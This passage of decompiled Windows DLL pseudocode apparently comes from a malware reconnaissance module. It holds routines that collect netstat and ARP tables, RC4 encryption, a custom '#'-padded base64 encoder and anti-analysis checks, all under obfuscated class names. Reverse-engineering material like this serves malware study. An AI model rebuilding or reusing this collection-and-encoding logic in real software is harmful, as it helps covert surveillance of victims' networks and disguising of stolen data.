      if ( v3 >= v11 )
        break;
      v7 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 20))(this + 1, v3);
      if ( sub_1000A939(Buf1, v7) )
        break;
      v8 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 20))(this + 1, v3);
      if ( sub_1000A950(Buf1, v8) )
      {
        v11 = v3;
        v9 = v4 + v3;
      }
      else
      {
        v4 = v3;
        v9 = v11 + v3 + 1;
      }
      v3 = v9 / 2;
    }
    while ( v9 / 2 > v4 );
    v6 = v3 == v4;
  }
  if ( v6 )
    return v4 + 1;
  return v3;
}

//----- (1000AC29) --------------------------------------------------------
_DWORD *__thiscall sub_1000AC29(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // eax

  this[1] = 0;
  *this = &mm::data::List<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';
  v3 = sub_10001E8B(1u, a2);
  this[2] = v3;
  this[3] = operator new(24 * v3);
  return this;
}
// 1001E684: using guessed type void *mm::data::List<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';

//----- (1000AC62) --------------------------------------------------------
_DWORD *__thiscall sub_1000AC62(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // eax

  this[1] = 0;
  *this = &mm::data::List<bool>::`vftable';
  v3 = sub_10001E8B(1u, a2);
  this[2] = v3;
  this[3] = operator new(v3);
  return this;
}
// 1001E6CC: using guessed type void *mm::data::List<bool>::`vftable';

//----- (1000AC8D) --------------------------------------------------------
_DWORD *__thiscall sub_1000AC8D(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // eax

  this[1] = 0;
  *this = &mm::data::List<NetstatAndArpCollector::ARP_RECORD>::`vftable';
  v3 = sub_10001E8B(1u, a2);
  this[2] = v3;
  this[3] = operator new(16 * v3);
  return this;
}
// 1001E764: using guessed type void *mm::data::List<NetstatAndArpCollector::ARP_RECORD>::`vftable';

//----- (1000ACC6) --------------------------------------------------------
void __thiscall sub_1000ACC6(_DWORD *this)
{
  HMODULE v2; // eax

  *this = &UmpwwllNooDilVraxtwump::`vftable';
  v2 = (HMODULE)this[2];
  if ( v2 )
    FreeLibrary(v2);
  sub_1000A983(this + 1812);
  sub_1000A60A(this + 1802);
  *this = &BVzrxdlmeb::`vftable';
}
// 1001B638: using guessed type void *BVzrxdlmeb::`vftable';
// 1001E7F8: using guessed type void *UmpwwllNooDilVraxtwump::`vftable';

//----- (1000AD18) --------------------------------------------------------
void __thiscall sub_1000AD18(char *this)
{
  unsigned int v2; // edi
  char *v3; // ebx
  const void *v4; // eax
  int v5[4]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+20h] [ebp-10h]
  int v7; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(_DWORD *, int *))(*((_DWORD *)this + 1802) + 16))((_DWORD *)this + 1802, v5);
  v2 = 0;
  v7 = 0;
  v6 = 0;
  if ( sub_10002E1A(v5) )
  {
    v3 = this + 36;
    do
    {
      if ( v2 >= 0x100 )
        break;
      v4 = (const void *)(*(int (__thiscall **)(int *, unsigned int))(v5[0] + 16))(v5, v2);
      memcpy(v3, v4, 0x18u);
      ++v6;
      ++v2;
      v3 += 24;
    }
    while ( v2 < sub_10002E1A(v5) );
  }
  v7 = -1;
  *((_DWORD *)this + 8) = v6;
  sub_1000A236(v5);
}

//----- (1000AD95) --------------------------------------------------------
void __thiscall sub_1000AD95(char *this)
{
  unsigned int v2; // edi
  char *v3; // ebx
  const void *v4; // eax
  int v5[4]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+20h] [ebp-10h]
  int v7; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(_DWORD *, int *))(*((_DWORD *)this + 1812) + 16))((_DWORD *)this + 1812, v5);
  v2 = 0;
  v7 = 0;
  v6 = 0;
  if ( sub_10002E1A(v5) )
  {
    v3 = this + 6184;
    do
    {
      if ( v2 >= 0x40 )
        break;
      v4 = (const void *)(*(int (__thiscall **)(int *, unsigned int))(v5[0] + 16))(v5, v2);
      memcpy(v3, v4, 0x10u);
      ++v6;
      ++v2;
      v3 += 16;
    }
    while ( v2 < sub_10002E1A(v5) );
  }
  v7 = -1;
  *((_DWORD *)this + 1545) = v6;
  sub_1000A628(v5);
}

//----- (1000AE15) --------------------------------------------------------
int __thiscall sub_1000AE15(_DWORD *this, _BYTE *a2, unsigned int a3)
{
  int v4; // ebx
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != sub_10002E1A(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a3, &unk_1001E60F);
  v4 = *this;
  v5 = sub_10002E1A(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 24))(this, v5 + 1);
  for ( i = sub_10002E1A(this); i > a3; --i )
    *(_BYTE *)(i + this[3]) = *(_BYTE *)(i + this[3] - 1);
  result = this[3];
  *(_BYTE *)(a3 + result) = *a2;
  ++this[1];
  return result;
}

//----- (1000AE71) --------------------------------------------------------
int __thiscall sub_1000AE71(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  int result; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001E672);
  --this[1];
  while ( v2 < sub_10002E1A(this) )
  {
    *(_BYTE *)(v2 + this[3]) = *(_BYTE *)(v2 + this[3] + 1);
    ++v2;
  }
  result = sub_10002E1A(this);
  *(_BYTE *)(result + this[3]) = 0;
  return result;
}

//----- (1000AEB2) --------------------------------------------------------
void **__thiscall sub_1000AEB2(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int, _DWORD, int); // ebx
  int v4; // eax
  void *v6; // [esp-Ch] [ebp-14h]
  int v7; // [esp-8h] [ebp-10h]

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int, _DWORD, int))*this;
    this[2] = (void *)1;
    v7 = sub_10002E1A(a2);
    v6 = a2[3];
    v4 = sub_10002E1A(a2);
    ((void (__thiscall **)(void **, int, void *, int))v3)[15](this, v4, v6, v7);
  }
  return this;
}

//----- (1000AEF1) --------------------------------------------------------
unsigned int __thiscall sub_1000AEF1(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v7; // edx
  int *v8; // ecx
  unsigned int v9; // [esp+18h] [ebp+Ch]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001E675);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 24))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 24))(a4, this[1] - a2);
  v9 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    do
    {
      if ( v9 >= a2 )
      {
        v7 = *a4;
        v8 = a4;
      }
      else
      {
        v7 = *a3;
        v8 = a3;
      }
      (*(void (__thiscall **)(int *, unsigned int))(v7 + 8))(v8, v9 + this[3]);
      ++v9;
      result = sub_10002E1A(this);
    }
    while ( v9 < result );
  }
  return result;
}

//----- (1000AF64) --------------------------------------------------------
unsigned int __thiscall sub_1000AF64(_DWORD *this)
{
  unsigned int result; // eax
  int v3; // eax
  unsigned int v4; // ebx
  int v5; // eax
  unsigned int v6; // eax
  int v7; // ecx
  _BYTE *v8; // edx
  unsigned int v9; // edi
  unsigned int v10; // [esp+4h] [ebp-4h]

  sub_1000D728();
  v10 = 0;
  result = sub_10002E1A(this);
  if ( (result & 0xFFFFFFFE) != 0 )
  {
    do
    {
      v3 = sub_10002E1A(this);
      v4 = sub_1000D71A(v3);
      v5 = sub_10002E1A(this);
      v6 = sub_1000D71A(v5);
      ++v10;
      v7 = this[3];
      v8 = (_BYTE *)(v7 + v4);
      v9 = v6;
      LOBYTE(v7) = *(_BYTE *)(v7 + v6);
      LOBYTE(v6) = *v8;
      *v8 = v7;
      *(_BYTE *)(v9 + this[3]) = v6;
      result = (unsigned int)sub_10002E1A(this) >> 1;
    }
    while ( v10 < result );
  }
  return result;
}

//----- (1000AFCD) --------------------------------------------------------
unsigned int __thiscall sub_1000AFCD(_DWORD *this, int a2, int a3, int a4)
{
  size_t v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 56))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(v5);
  this[1] = a2;
  v6 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    do
    {
      *(_BYTE *)(v6 + this[3]) = *(_BYTE *)(v6 + a3);
      ++v6;
      result = sub_10002E1A(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (1000B01C) --------------------------------------------------------
bool __thiscall sub_1000B01C(_DWORD *this, void *Buf2)
{
  int v3; // edi
  void *v4; // eax
  bool result; // al

  v3 = sub_1000AADF(this, Buf2);
  result = 0;
  if ( v3 != sub_1000AB9B(this) )
  {
    v4 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 20))(this + 1, v3);
    if ( sub_1000A5BC(v4, Buf2) )
      return 1;
  }
  return result;
}

//----- (1000B059) --------------------------------------------------------
char __thiscall sub_1000B059(_DWORD *this, void *Buf2)
{
  int v3; // ebx
  void *v4; // eax

  v3 = sub_1000AADF(this, Buf2);
  if ( v3 == sub_1000AB9B(this) )
    return 0;
  v4 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, v3);
  if ( !sub_1000A5BC(v4, Buf2) )
    return 0;
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 12))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 12))(this + 5, v3);
  return 1;
}

//----- (1000B0AB) --------------------------------------------------------
int __thiscall sub_1000B0AB(_DWORD *this, void *Buf2)
{
  int v3; // edi
  void *v4; // eax
  int v5; // eax
  void *v7; // [esp-4h] [ebp-Ch]

  v3 = sub_1000AADF(this, Buf2);
  if ( v3 == sub_1000AB9B(this)
    || (v7 = Buf2,
        v4 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, v3),
        !sub_1000A5BC(v4, v7)) )
  {
    (*(void (__thiscall **)(_DWORD *, void *, int))(this[1] + 4))(this + 1, Buf2, v3);
    v5 = this[5];
    HIBYTE(Buf2) = 0;
    (*(void (__thiscall **)(_DWORD *, char *, int))(v5 + 4))(this + 5, (char *)&Buf2 + 3, v3);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 16))(this + 5, v3);
}

//----- (1000B10A) --------------------------------------------------------
int __thiscall sub_1000B10A(_DWORD *this, void *pExceptionObject)
{
  int v3; // edi
  void *v4; // eax
  void *v6; // [esp-4h] [ebp-Ch]

  v3 = sub_1000AADF(this, pExceptionObject);
  if ( v3 == sub_1000AB9B(this)
    || (v6 = pExceptionObject,
        v4 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 20))(this + 1, v3),
        !sub_1000A5BC(v4, v6)) )
  {
    sub_1000D701(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, &_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 20))(this + 5, v3);
}

//----- (1000B163) --------------------------------------------------------
_DWORD *__thiscall sub_1000B163(_DWORD *this, _DWORD *a2)
{
  sub_1000AAA9(a2, this + 1);
  return a2;
}

//----- (1000B17E) --------------------------------------------------------
bool __thiscall sub_1000B17E(_DWORD *this, void *Buf2)
{
  int v3; // edi
  void *v4; // eax
  bool result; // al

  v3 = sub_1000ABA3(this, Buf2);
  result = 0;
  if ( v3 != sub_1000AB9B(this) )
  {
    v4 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 20))(this + 1, v3);
    if ( sub_1000A939(v4, Buf2) )
      return 1;
  }
  return result;
}

//----- (1000B1BB) --------------------------------------------------------
char __thiscall sub_1000B1BB(_DWORD *this, void *Buf2)
{
  int v3; // ebx
  void *v4; // eax

  v3 = sub_1000ABA3(this, Buf2);
  if ( v3 == sub_1000AB9B(this) )
    return 0;
  v4 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, v3);
  if ( !sub_1000A939(v4, Buf2) )
    return 0;
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 12))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 12))(this + 5, v3);
  return 1;
}

//----- (1000B20D) --------------------------------------------------------
int __thiscall sub_1000B20D(_DWORD *this, void *Buf2)
{
  int v3; // edi
  void *v4; // eax
  int v5; // eax
  void *v7; // [esp-4h] [ebp-Ch]

  v3 = sub_1000ABA3(this, Buf2);
  if ( v3 == sub_1000AB9B(this)
    || (v7 = Buf2,
        v4 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, v3),
        !sub_1000A939(v4, v7)) )
  {
    (*(void (__thiscall **)(_DWORD *, void *, int))(this[1] + 4))(this + 1, Buf2, v3);
    v5 = this[5];
    HIBYTE(Buf2) = 0;
    (*(void (__thiscall **)(_DWORD *, char *, int))(v5 + 4))(this + 5, (char *)&Buf2 + 3, v3);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 16))(this + 5, v3);
}

//----- (1000B26C) --------------------------------------------------------
int __thiscall sub_1000B26C(_DWORD *this, void *pExceptionObject)
{
  int v3; // edi
  void *v4; // eax
  void *v6; // [esp-4h] [ebp-Ch]

  v3 = sub_1000ABA3(this, pExceptionObject);
  if ( v3 == sub_1000AB9B(this)
    || (v6 = pExceptionObject,
        v4 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 20))(this + 1, v3),
        !sub_1000A939(v4, v6)) )
  {
    sub_1000D701(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, &_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 20))(this + 5, v3);
}

//----- (1000B2C5) --------------------------------------------------------
_DWORD *__thiscall sub_1000B2C5(_DWORD *this, _DWORD *a2)
{
  sub_1000AB65(a2, this + 1);
  return a2;
}

//----- (1000B2E0) --------------------------------------------------------
int __thiscall sub_1000B2E0(_DWORD *this)
{
  return sub_1000AB9B(this + 1);
}

//----- (1000B2E8) --------------------------------------------------------
_DWORD *__thiscall sub_1000B2E8(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp-8h] [ebp-10h]
  int v6; // [esp-4h] [ebp-Ch]

  *this = &mm::data::List<bool>::`vftable';
  this[2] = 1;
  v6 = sub_10002E1A(a2);
  v5 = a2[3];
  v3 = sub_10002E1A(a2);
  sub_1000AFCD(this, v3, v5, v6);
  return this;
}
// 1001E6CC: using guessed type void *mm::data::List<bool>::`vftable';

//----- (1000B31E) --------------------------------------------------------
_DWORD *__thiscall sub_1000B31E(_DWORD *this, unsigned int a2)
{
  *this = &mm::data::Map<NetstatAndArpCollector::NETSTAT_RECORD,bool>::`vftable';
  sub_1000AC29(this + 1, a2);
  sub_1000AC62(this + 5, a2);
  return this;
}
// 1001E710: using guessed type void *mm::data::Map<NetstatAndArpCollector::NETSTAT_RECORD,bool>::`vftable';

//----- (1000B359) --------------------------------------------------------
_DWORD *__thiscall sub_1000B359(_DWORD *this, unsigned int a2)
{
  *this = &mm::data::Map<NetstatAndArpCollector::ARP_RECORD,bool>::`vftable';
  sub_1000AC8D(this + 1, a2);
  sub_1000AC62(this + 5, a2);
  return this;
}
// 1001E7A8: using guessed type void *mm::data::Map<NetstatAndArpCollector::ARP_RECORD,bool>::`vftable';

//----- (1000B394) --------------------------------------------------------
_DWORD *__thiscall sub_1000B394(_DWORD *Block, char a2)
{
  sub_1000ACC6(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000B3B0) --------------------------------------------------------
char __thiscall sub_1000B3B0(_DWORD *this)
{
  int *v2; // esi
  bool v4; // zf
  _DWORD *v5; // ebx
  int *v6; // edi
  int v7; // [esp+8h] [ebp-20h] BYREF
  int v8; // [esp+Ch] [ebp-1Ch]
  int v9; // [esp+10h] [ebp-18h]
  int v10; // [esp+14h] [ebp-14h]
  int v11; // [esp+18h] [ebp-10h]
  int v12; // [esp+1Ch] [ebp-Ch]
  unsigned int v13; // [esp+20h] [ebp-8h]
  size_t Size; // [esp+24h] [ebp-4h] BYREF

  v2 = (int *)malloc(0x18u);
  if ( !v2 )
    return 1;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  Size = 0;
  if ( ((int (__stdcall *)(int *, size_t *, _DWORD))this[3])(v2, &Size, 0) != 122 )
    goto LABEL_10;
  free(v2);
  v2 = (int *)malloc(Size);
  if ( !v2 )
    return 1;
  if ( ((int (__stdcall *)(int *, size_t *, _DWORD))this[3])(v2, &Size, 0) || (v4 = *v2 == 0, v13 = 0, v4) )
  {
LABEL_10:
    free(v2);
    return 1;
  }
  v5 = this + 1802;
  v6 = v2 + 2;
  while ( 1 )
  {
    v8 = v6[2];
    v7 = *v6;
    v10 = v6[3];
    v9 = v6[1];
    v11 = *(v6 - 1);
    v12 = 6;
    if ( (unsigned int)sub_1000B2E0(v5) >= 0x100 )
      return 0;
    (*(void (__thiscall **)(_DWORD *, int *))(*v5 + 8))(v5, &v7);
    ++v13;
    v6 += 5;
    if ( v13 >= *v2 )
      goto LABEL_10;
  }
}

//----- (1000B481) --------------------------------------------------------
char __thiscall sub_1000B481(_DWORD *this)
{
  int *v2; // esi
  bool v4; // zf
  _DWORD *v5; // ebx
  int *v6; // edi
  int v7; // eax
  int v8; // [esp+8h] [ebp-20h] BYREF
  int v9; // [esp+Ch] [ebp-1Ch]
  int v10; // [esp+10h] [ebp-18h]
  int v11; // [esp+14h] [ebp-14h]
  int v12; // [esp+18h] [ebp-10h]
  int v13; // [esp+1Ch] [ebp-Ch]
  unsigned int v14; // [esp+20h] [ebp-8h]
  size_t Size; // [esp+24h] [ebp-4h] BYREF

  v2 = (int *)malloc(0xCu);
  if ( !v2 )
    return 1;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  Size = 0;
  if ( ((int (__stdcall *)(int *, size_t *, _DWORD))this[4])(v2, &Size, 0) != 122 )
    goto LABEL_10;
  free(v2);
  v2 = (int *)malloc(Size);
  if ( !v2 )
    return 1;
  if ( ((int (__stdcall *)(int *, size_t *, _DWORD))this[4])(v2, &Size, 0) || (v4 = *v2 == 0, v14 = 0, v4) )
  {
LABEL_10:
    free(v2);
    return 1;
  }
  v5 = this + 1802;
  v6 = v2 + 2;
  while ( 1 )
  {
    v9 = 0;
    v7 = *(v6 - 1);
    v11 = 0;
    v8 = v7;
    v10 = *v6;
    v13 = 17;
    if ( (unsigned int)sub_1000B2E0(v5) >= 0x100 )
      return 0;
    (*(void (__thiscall **)(_DWORD *, int *))(*v5 + 8))(v5, &v8);
    ++v14;
    v6 += 2;
    if ( v14 >= *v2 )
      goto LABEL_10;
  }
}

//----- (1000B548) --------------------------------------------------------
char __thiscall sub_1000B548(_DWORD *this)
{
  unsigned int *v2; // esi
  bool v4; // zf
  _DWORD *v5; // ebx
  size_t *v6; // edi
  size_t Size; // [esp+8h] [ebp-1Ch] BYREF
  unsigned int v8; // [esp+Ch] [ebp-18h]
  size_t v9; // [esp+10h] [ebp-14h] BYREF
  _DWORD v10[2]; // [esp+14h] [ebp-10h] BYREF
  size_t v11; // [esp+1Ch] [ebp-8h]

  v2 = (unsigned int *)malloc(4u);
  if ( !v2 )
    return 1;
  v9 = 0;
  v10[0] = 0;
  v10[1] = 0;
  v11 = 0;
  Size = 0;
  if ( ((int (__stdcall *)(unsigned int *, size_t *, _DWORD))this[5])(v2, &Size, 0) != 122 )
    goto LABEL_10;
  free(v2);
  v2 = (unsigned int *)malloc(Size);
  if ( !v2 )
    return 1;
  if ( ((int (__stdcall *)(unsigned int *, size_t *, _DWORD))this[5])(v2, &Size, 0) || (v4 = *v2 == 0, v8 = 0, v4) )
  {
LABEL_10:
    free(v2);
    return 1;
  }
  v5 = this + 1812;
  v6 = v2 + 2;
  while ( 1 )
  {
    v9 = *v6;
    memcpy(v10, v6 + 1, *v6);
    v11 = v6[3];
    if ( (unsigned int)sub_1000B2E0(v5) >= 0x40 )
      return 0;
    (*(void (__thiscall **)(_DWORD *, size_t *))(*v5 + 8))(v5, &v9);
    ++v8;
    v6 += 6;
    if ( v8 >= *v2 )
      goto LABEL_10;
  }
}
// 1000B548: using guessed type _DWORD var_10[2];

//----- (1000B622) --------------------------------------------------------
_DWORD *__thiscall sub_1000B622(_DWORD *this, _DWORD *a2)
{
  sub_1000B2E8(a2, this + 5);
  return a2;
}

//----- (1000B63D) --------------------------------------------------------
_DWORD *__thiscall sub_1000B63D(_DWORD *this)
{
  *this = &mm::data::Set<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';
  sub_1000B31E(this + 1, 0x10u);
  return this;
}
// 1001E73C: using guessed type void *mm::data::Set<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';

//----- (1000B654) --------------------------------------------------------
_DWORD *__thiscall sub_1000B654(_DWORD *this)
{
  *this = &mm::data::Set<NetstatAndArpCollector::ARP_RECORD>::`vftable';
  sub_1000B359(this + 1, 0x10u);
  return this;
}
// 1001E7D4: using guessed type void *mm::data::Set<NetstatAndArpCollector::ARP_RECORD>::`vftable';

//----- (1000B66B) --------------------------------------------------------
_DWORD *__thiscall sub_1000B66B(_DWORD *this)
{
  this[1] = 13;
  *this = &UmpwwllNooDilVraxtwump::`vftable';
  this[2] = 0;
  sub_1000B63D(this + 1802);
  sub_1000B654(this + 1812);
  memset(this + 6, 0, 0x1C10u);
  this[6] = this[1];
  this[2] = 0;
  this[3] = 0;
  this[4] = 0;
  this[5] = 0;
  return this;
}
// 1001E7F8: using guessed type void *UmpwwllNooDilVraxtwump::`vftable';

//----- (1000B711) --------------------------------------------------------
void __thiscall sub_1000B711(char *this)
{
  int v1; // edi

  if ( sub_1000C8E9((int)this, (int)&dword_10026D40, 1u, 0) )
  {
    if ( sub_1000A1AC((int)this) )
    {
      v1 = 2;
      do
      {
        sub_1000B3B0(this);
        sub_1000B481(this);
        sub_1000B548(this);
        sub_1000AD18(this);
        sub_1000AD95(this);
        Sleep(0xBB8u);
        --v1;
      }
      while ( v1 );
    }
    else
    {
      *((_DWORD *)this + 7) = 222;
    }
  }
}
// 10026D40: using guessed type int dword_10026D40;

//----- (1000B745) --------------------------------------------------------
_DWORD *__thiscall sub_1000B745(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 18;
  *this = &XmzzhvdvbmEKKCQxmzzhvdv::`vftable';
  memset(this + 2, 0, 8u);
  *v2 = this[1];
  return this;
}
// 1001E810: using guessed type void *XmzzhvdvbmEKKCQxmzzhvdv::`vftable';

//----- (1000B770) --------------------------------------------------------
DWORD __thiscall sub_1000B770(_DWORD *this)
{
  unsigned int v2; // edi
  DWORD result; // eax

  sub_1000D728();
  v2 = sub_1000D71A(0x7FFFu);
  result = GetTickCount();
  this[3] = result ^ v2;
  return result;
}

//----- (1000B794) --------------------------------------------------------
int sub_1000B794()
{
  return 8;
}

//----- (1000B798) --------------------------------------------------------
char __thiscall sub_1000B798(int this, void *a2, unsigned int a3)
{
  if ( a3 < 8 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 8u);
  return 1;
}

//----- (1000B7BA) --------------------------------------------------------
int __cdecl sub_1000B7BA(_BYTE *a1, unsigned __int8 *a2, int a3, int a4)
{
  _BYTE *v4; // eax
  _BYTE *v7; // eax
  _BYTE *v9; // eax
  unsigned __int8 v10; // cl
  _BYTE *v11; // eax
  _BYTE *v12; // eax
  int i; // [esp+18h] [ebp+8h]

  v4 = a1;
  for ( i = a3; i >= 3; a4 -= 4 )
  {
    if ( a4 < 7 )
      break;
    *v4 = byte_1001E828[*a2 >> 2];
    i -= 3;
    v7 = v4 + 1;
    *v7++ = byte_1001E828[(a2[1] >> 4) | (16 * (*a2 & 3))];
    *v7++ = byte_1001E828[(a2[2] >> 6) | (4 * (a2[1] & 0xF))];
    *v7 = byte_1001E828[a2[2] & 0x3F];
    v4 = v7 + 1;
    a2 += 3;
  }
  if ( a4 > 6 )
  {
    if ( i > 0 )
    {
      *v4 = byte_1001E828[*a2 >> 2];
      v9 = v4 + 1;
      v10 = 16 * (*a2 & 3);
      if ( i > 1 )
        v10 |= a2[1] >> 4;
      *v9 = byte_1001E828[v10];
      v11 = v9 + 1;
      if ( i >= 2 )
        *v11 = byte_1001E828[4 * (a2[1] & 0xF)];
      else
        *v11 = 35;
      v12 = v11 + 1;
      *v12 = 35;
      v4 = v12 + 1;
    }
    *v4 = 0;
    return v4 - a1 + 1;
  }
  else
  {
    *v4 = 0;
    return -1;
  }
}

//----- (1000B8B0) --------------------------------------------------------
int __cdecl sub_1000B8B0(int a1, int a2, int a3)
{
  int v4; // edx
  int i; // eax
  int j; // edi
  _BYTE *v7; // eax
  int result; // eax
  unsigned __int8 v9; // [esp+Bh] [ebp+Bh]

  LOBYTE(v4) = 0;
  for ( i = 0; i < 256; ++i )
    *(_BYTE *)(i + a1) = i;
  *(_BYTE *)(a1 + 256) = 0;
  *(_BYTE *)(a1 + 257) = 0;
  v9 = 0;
  for ( j = 0; j < 256; ++j )
  {
    v9 += *(_BYTE *)(j + a1) + *(_BYTE *)((unsigned __int8)v4 + a2);
    byte_10026D50 = *(_BYTE *)(j + a1);
    v7 = (_BYTE *)(a1 + v9);
    *(_BYTE *)(j + a1) = *v7;
    *v7 = byte_10026D50;
    result = ((unsigned __int8)v4 + 1) / a3;
    v4 = ((unsigned __int8)v4 + 1) % a3;
  }
  return result;
}
// 10026D50: using guessed type char byte_10026D50;

//----- (1000B915) --------------------------------------------------------
void __cdecl sub_1000B915(int a1, int a2, unsigned int a3)
{
  unsigned int i; // edi
  char v4; // dl
  char *v5; // esi
  char v6; // cl

  for ( i = 0; i < a3; ++i )
  {
    v4 = *(_BYTE *)((unsigned __int8)++*(_BYTE *)(a1 + 256) + a1);
    *(_BYTE *)(a1 + 257) += v4;
    v5 = (char *)(*(unsigned __int8 *)(a1 + 257) + a1);
    v6 = *v5;
    *v5 = v4;
    *(_BYTE *)(*(unsigned __int8 *)(a1 + 256) + a1) = v6;
    *(_BYTE *)(i + a2) ^= *(_BYTE *)((unsigned __int8)(v4 + v6) + a1);
  }
}

//----- (1000B96B) --------------------------------------------------------
int __cdecl sub_1000B96B(int a1)
{
  return a1;
}

//----- (1000B970) --------------------------------------------------------
unsigned int __cdecl sub_1000B970(int a1, unsigned int a2)
{
  int v2; // eax

  v2 = sub_1000B96B(a1);
  return a2 * ((v2 + a2 - 1) / a2) - v2;
}

//----- (1000B992) --------------------------------------------------------
int sub_1000B992()
{
  return 1;
}

//----- (1000B996) --------------------------------------------------------
BOOL sub_1000B996()
{
  int i; // eax
  unsigned int v1; // eax
  char *v2; // esi
  int v3; // edi
  int v4; // edi
  int v5; // eax
  int v6; // edi
  unsigned __int8 v7; // di
  int j; // eax
  unsigned int v9; // eax
  unsigned int v10; // esi
  int v12; // [esp+0h] [ebp-44h] BYREF
  char v13[45]; // [esp+4h] [ebp-40h] BYREF
  char v14[4]; // [esp+31h] [ebp-13h] BYREF
  char v15; // [esp+35h] [ebp-Fh] BYREF

  for ( i = 0; i < 16; ++i )
    v13[i + 44] = i;
  v1 = sub_1000B970((int)v13, 4u);
  v2 = &v13[v1];
  v3 = v1;
  memset(&v12, 0, sizeof(v12));
  LOBYTE(v3) = v3 >= 0 && v3 < 4 && v12 == 0;
  memset(&v12, 255, sizeof(v12));
  v4 = (v12 == -1 && (_WORD)v12 == 0xFFFF) & (unsigned __int8)v3;
  if ( v4 == 1 )
  {
    v5 = 8;
    do
      --v5;
    while ( v5 );
  }
  memset(&v12, 0, sizeof(v12));
  v6 = (v12 == 0) & (unsigned __int8)v4;
  if ( v6 == 1 )
  {
    memset32(v2, (int)v2, 0xAu);
    memset(v2 + 4, 0, 0x20u);
    v7 = *(_DWORD *)v2 == (_DWORD)v2;
    for ( j = 1; j < 9; ++j )
      v7 &= *(_DWORD *)&v2[4 * j] == 0;
    v6 = (*((_DWORD *)v2 + 9) == (_DWORD)v2) & v7;
    if ( v6 == 1 )
    {
      v9 = sub_1000B970((int)v14, 4u) + 1;
      v10 = (unsigned int)&v13[v9 + 44];
      v6 = &v13[v9 + 44] < &v15 && v9 != 0 && v9 < 5 && v10 >= (unsigned int)v14 && (v10 & 3) == 0;
      if ( v6 == 1 )
        return *(_DWORD *)v10 != 0 && *(_DWORD *)&v14[v9 + 3] != 0;
    }
  }
  return v6;
}
// 1000BA2C: masking with 0x1 was optimized away because di.1 <= 0x1

//----- (1000BB05) --------------------------------------------------------
int sub_1000BB05()
{
  return 0;
}

//----- (1000BB08) --------------------------------------------------------
BOOL __usercall sub_1000BB08@<eax>(_DWORD *a1@<eax>)
{
  return *a1 != -3 || a1[1] != -2 || a1[2] != -1;
}

//----- (1000BB20) --------------------------------------------------------
unsigned int __usercall sub_1000BB20@<eax>(int a1@<eax>, unsigned __int8 *a2, _BYTE *a3, _DWORD *a4, int a5)
{
  _BYTE *v5; // edi
  unsigned __int8 *v6; // esi
  unsigned __int8 *v7; // edx
  unsigned __int8 **v8; // ecx
  unsigned __int8 *v9; // ebx
  unsigned int v10; // esi
  unsigned int v11; // edx
  char v12; // al
  unsigned int v13; // esi
  unsigned __int8 v14; // al
  unsigned __int8 v15; // al
  unsigned __int8 v16; // al
  unsigned __int8 v17; // al
  unsigned __int8 v18; // al
  _BYTE *i; // ebx
  unsigned int v20; // ebx
  char v21; // al
  char v22; // al
  char v23; // al
